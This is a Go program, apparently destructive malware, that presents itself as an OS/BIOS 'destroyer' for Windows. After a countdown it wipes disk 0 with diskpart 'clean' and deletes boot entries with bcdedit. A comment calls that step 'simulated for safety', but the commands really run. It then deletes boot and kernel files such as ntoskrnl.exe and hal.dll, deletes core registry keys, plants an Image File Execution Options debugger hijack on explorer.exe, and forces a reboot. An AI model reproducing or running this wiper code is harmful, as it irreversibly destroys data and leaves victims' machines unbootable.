// HardwareDestroyer.go - GO UNTUK RUSAK OS/BIOS
package main

import (
	"fmt"
	"os"
	"os/exec"
	"time"
)

func main() {
	fmt.Println("🔥 GO HARDWARE DESTROYER - OS/BIOS CORRUPTION")
	fmt.Println("=============================================")
	
	// Check if running as admin
	if !isAdmin() {
		fmt.Println("⚠️ Run as Administrator for full destruction")
		runAsAdmin()
		return
	}
	
	fmt.Println("💀 ACTIVATING HARDWARE DESTRUCTION...")
	fmt.Println("1. MBR/Bootloader destruction")
	fmt.Println("2. BIOS corruption attempt")
	fmt.Println("3. System file deletion")
	fmt.Println("4. Registry corruption")
	fmt.Println("5. Force restart")
	
	// Give 5 seconds warning
	for i := 5; i > 0; i-- {
		fmt.Printf("⏱️ Destruction in %d seconds...\n", i)
		time.Sleep(1 * time.Second)
	}
	
	// Execute destruction
	executeDestruction()
}

func isAdmin() bool {
	// Simple admin check for Windows
	cmd := exec.Command("net", "session")
	err := cmd.Run()
	return err == nil
}

func runAsAdmin() {
	// Try to re-run as admin
	fmt.Println("🔧 Attempting to run as Administrator...")
	time.Sleep(3 * time.Second)
}

func executeDestruction() {
	fmt.Println("💀💀💀 EXECUTING HARDWARE DESTRUCTION! 💀💀💀")
	
	// Phase 1: MBR Destruction
	destroyMBR()
	
	// Phase 2: BIOS corruption attempt
	corruptBIOS()
	
	// Phase 3: System file deletion
	deleteSystemFiles()
	
	// Phase 4: Registry corruption
	corruptRegistry()
	
	// Phase 5: Force restart
	forceRestart()
}

func destroyMBR() {
	fmt.Println("💾 DESTROYING MBR...")
	
	// Try diskpart method
	script := `select disk 0
clean
exit`
	
	// Write diskpart script
	os.WriteFile("destroy_mbr.txt", []byte(script), 0644)
	
	// Execute diskpart
	cmd := exec.Command("diskpart", "/s", "destroy_mbr.txt")
	cmd.Run()
	
	// Cleanup
	os.Remove("destroy_mbr.txt")
	
	fmt.Println("✅ MBR destruction attempted")
}

func corruptBIOS() {
	fmt.Println("⚡ ATTEMPTING BIOS CORRUPTION...")
	
	// BIOS corruption techniques (simulated for safety)
	commands := []string{
		"bcdedit /delete {default} /f",
		"bcdedit /delete {bootmgr} /f",
		"bcdedit /delete {current} /f",
	}
	
	for _, cmd := range commands {
		exec.Command("cmd", "/c", cmd).Run()
	}
	
	fmt.Println("✅ BIOS corruption attempted")
}

func deleteSystemFiles() {
	fmt.Println("🗑️  DELETING SYSTEM FILES...")
	
	files := []string{
		"C:\\bootmgr",
		"C:\\boot\\bcd",
		"C:\\Windows\\System32\\ntoskrnl.exe",
		"C:\\Windows\\System32\\hal.dll",
		"C:\\Windows\\System32\\winload.exe",
	}
	
	for _, file := range files {
		os.Remove(file)
	}
	
	fmt.Println("✅ System files deletion attempted")
}

func corruptRegistry() {
	fmt.Println("🔧 CORRUPTING REGISTRY...")
	
	commands := []string{
		`reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /f`,
		`reg delete "HKLM\SYSTEM\CurrentControlSet\Control" /f`,
		`reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe" /v Debugger /t REG_SZ /d "cmd.exe /c echo SYSTEM DESTROYED" /f`,
	}
	
	for _, cmd := range commands {
		exec.Command("cmd", "/c", cmd).Run()
	}
	
	fmt.Println("✅ Registry corruption attempted")
}

func forceRestart() {
	fmt.Println("🔄 FORCE RESTARTING SYSTEM...")
	
	exec.Command("shutdown", "/r", "/t", "0", "/c", "💀 GO HARDWARE DESTRUCTION COMPLETE").Run()
	
	fmt.Println("✅ System restart initiated")
}